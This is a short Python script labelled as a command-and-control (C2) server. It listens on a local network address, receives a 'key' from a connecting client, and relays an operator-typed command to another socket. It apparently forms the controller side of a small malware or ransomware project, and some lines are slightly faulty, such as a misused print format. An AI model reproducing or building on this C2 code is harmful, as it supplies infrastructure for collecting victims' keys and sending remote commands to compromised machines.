import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("192.168.5.129", 5678))
s.listen(5)
print("C2 server started")
while True:
    clientsocket, address = s.accept()
    print(f"Connection from {address} has been established")
    key = clientsocket.recv(1024)
    print("Key received: %s", key.decode("utf-8"))

    s2.connect((socket.gethostname(), 5679))
    s2.send(f'Connection success'.encode('utf-8'))
    cmd = input("Enter command.\n")
    s2.send(f'{cmd}'.encode('utf-8'))
    break
s.close()
s2.close()
